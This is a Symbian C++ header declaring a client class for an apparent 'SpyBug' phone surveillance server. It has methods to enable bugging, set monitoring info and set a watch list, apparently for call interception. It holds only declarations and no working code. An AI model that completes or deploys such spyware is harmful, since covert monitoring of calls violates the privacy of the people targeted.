#ifndef __BugClient_H__
#define __BugClient_H__

#include <e32base.h>
#include "SpyBugInfo.h"

class MSrvTerminateObserver
	{
public:
	virtual void ServerTerminated() = 0;
	};
	
class RSpyBugSession;
class CSrvTerminateNotifier;

class CBugClient : public CActive,
				   public MSrvTerminateObserver
	{
public:
	/**
	* New
	* 
	* @leave KErrNotFound as a result of server connection failure,
	*        KErrNoMemorty
	*/
	IMPORT_C static CBugClient* NewL(const TFileName* aCallingAppPath);
	
	IMPORT_C ~CBugClient();
	
	IMPORT_C TVersion Version() const;
		
	IMPORT_C const TBugInfo& BugInfo();	
	
	/**
	* Set bug info
	* @param aSpyInfo if the specified param is equal to previous call then the function does nothing
	*/
	IMPORT_C TInt SetBugInfo(const TBugInfo& aSpyInfo);
	/*
	* Set spy info
	* 
	* The bugging will start and stop by checking value of aSpyInfo.iSpyEnable
	* if ETrue start the operation, stop otherwise.
	*
	* @return KErrNone if succesful
	*/
	IMPORT_C TInt SetMonitorInfo(const TMonitorInfo& aSpyInfo);
	
	/**
	* Get spy info
	* 
	* @return KErrNone if succesful
	* @param aSpyInfo on return result
	*/
	IMPORT_C TInt GetMonitorInfo(TMonitorInfo& aSpyInfo);
	
	/**
	* @todo add const to parameter
	* Set watch list
	* @param aCallInterInfo
	*/
	IMPORT_C TInt SetWatchList(TWatchList& aCallInterInfo);
	
	IMPORT_C void ReservedExport();	
	IMPORT_C void ReservedExport2();
	
private: //From MSrvTerminateObserver
	void ServerTerminated();
	
private:
	void RunL();
	void DoCancel();
	TInt RunError(TInt aErr);
	
private:
	CBugClient(const TFileName* aCallingAppPath);
	void ConstructL();
	void ConnectToServerL();
	void EnsureFileExistsL();
	
	void SessionCleanup();
	void CleanupIfServerDied(TInt aErr);	
	
	/**
	* 
	* @return KErrNone if succefull
	*/
	TInt DoConnect();	
	
	void IssueReconnectTimer();	
	void HandleServerTerminated();
	
	/**
	* Start CSrvTerminateNotifier task
	* 
	*/
	void StartNotifier();
private:
	enum TOpt
		{
		EOptNone,
		EOpServerReconnectTimer
		};
private:
	TOpt iOpt;
	TBugInfo iBugInfo;
	/**Client session.	
	Use it as pointer, just want forward declaration to work*/
	RSpyBugSession* iSession;
	TFileName	iCallingAppPath;	
	CSrvTerminateNotifier* iSrvDiedNotifier;
	RTimer iTimer;	
	TBool iServerDied;	
	/*
	Number of reconnect attempt*/	
	TInt iReconectAttempt;	
	/**
	Reserved data member*/
	TInt iReserved1;
	};

#endif
